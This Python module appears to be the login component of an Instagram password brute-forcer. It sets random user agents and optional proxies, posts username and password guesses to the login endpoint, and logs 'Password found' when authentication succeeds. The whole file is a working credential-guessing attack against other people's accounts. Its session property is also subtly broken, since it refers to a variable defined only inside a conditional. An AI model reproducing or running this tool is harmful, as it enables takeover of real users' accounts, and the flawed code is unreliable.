from requests_html import HTMLSession
from lib.src.const import session_data, ft
from lib.src.user_agent import user_agent
from datetime import datetime
from lib.src.debug.debug import Debug

class Browser:
	def __init__(self, username = None, password = None, proxy = None):
		self.username = username
		self.password = password
		self.proxy = proxy
		self._session = None
	@property
	def browser(self):
		if self._session is None:
			header = session_data['header']
			header['user-agent'] = user_agent()
			session = HTMLSession()
			session.headers.update(header)
			if self.proxy is not None:
				session.proxies.update(self.proxy)
		self._session = session
		return self._session
	def csrftoken(self):
		csrf_token = self.browser.get(session_data['home_url'], timeout=ft).cookies.get_dict()['csrftoken']
		return csrf_token
	def post(self):
		enc_password = "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(int(datetime.now().timestamp()), self.password)
		data = {
			session_data['username_field']: self.username,
			session_data['password_field']: enc_password
		}
		res = self.browser.post(session_data['login_url'], data=data, timeout=ft)
		print(res.status_code)
		return res.json()
	def user_exist(self):
		res = self.browser.get(session_data['home_url'] + f'/{self.username}', timeout=ft)
		if res.status_code == 404:
			Debug('[-] User Not exist')
			exit()
		
	def login(self):
		res = self.post()
		if res is not None:
			if res['authenticated']:
				Debug(f'[+] Password found: {self.password}')
				Debug(f'[*] Informations: \n  Username: {self.username}, \n  Password: {self.password}')
				exit()
			else:
				Debug(f'[-] {self.password} is incorrect')